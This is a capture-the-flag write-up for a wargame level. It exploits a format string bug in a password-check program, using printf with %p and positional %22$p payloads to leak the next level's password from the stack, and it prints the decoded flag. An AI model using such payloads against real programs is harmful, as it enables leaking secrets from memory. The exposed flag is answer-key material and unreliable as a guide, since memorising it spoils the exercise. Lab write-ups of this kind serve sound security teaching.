solution level02:

-> 288 bytes are allocated on the stack of main

-> there are 3 buffers:
* the first buffer is 41 bytes long, and is used to read the .pass file of level03
* the other 2 buffers are 100 bytes each. The program asks for a username and a password, and fills the buffers from the standard input with 2 calls to fgets.

at the start of the program, all these buffers are initialized to 0 (also the last byte is 1 for the .pass buffer, and 4 for the username and password buffers)

-> if the program can open and read the .pass file, it then asks the user for a username and a password

-> the program then compares the password buffer with the .pass buffer, and opens a shell if they are equal

-> otherwise, the program makes a call to printf with the username buffer as argument, then exits

-> since the .pass buffer is on the stack, we can display it by using the call to printf with the right username buffer
for example :
> python -c "print 'ABCDEFGH|%p.%p.%p.%p|%p.%p.%p.%p|%p.%p.%p.%p|%p.%p.%p.%p|%p.%p.%p.%p|%p.%p.%p.%p|%p.%p.%p.%p|%p.%p.%p.%p' + '\n' + 'A' + '\n'" | /home/users/level02/level02
ABCDEFGH|0x7fffffffe470.(nil).0x25.0x2a2a2a2a2a2a2a2a|0x2a2a2a2a2a2a2a2a.0x7fffffffe668.0x1f7ff9a08.0x70252e7025|(nil).(nil).(nil).(nil)|(nil).(nil).(nil).(nil)|(nil).(nil).(nil).0x100000000|(nil).0x756e505234376848.0x45414a3561733951.0x377a7143574e6758|0x354a35686e475873.0x48336750664b394d.(nil).0x4847464544434241|0x252e70252e70257c.0x2e70257c70252e70. does not have access!

from there it is pretty easy to spot the flag: the flag is 40 bytes (40 / 8 = 5) so we are interested in 5 parameters. We can also see the "ABCDEFGH" string right after our flag, corresponding to the start of the username buffer

-> we find that our flag starts at the 22nd argument on the stack

> python -c "print '%22\$p | %23\$p | %24\$p | %25\$p | %26\$p' + '\n' + 'A' + '\n'" | /home/users/level02/level02
0x756e505234376848 | 0x45414a3561733951 | 0x377a7143574e6758 | 0x354a35686e475873 | 0x48336750664b394d ...

if we convert this to the right endianness, and then get the ascii values, we get the flag :
4868373452506e75 | 51397361354a4145 | 58674e5743717a37 | 7358476e68354a35 | 4d394b6650673348
 H h 7 4 R P n u |  Q 9 s a 5 J A E |  X g N W C q z 7 |  s X G n h 5 J 5 |  M 9 K f P g 3 H
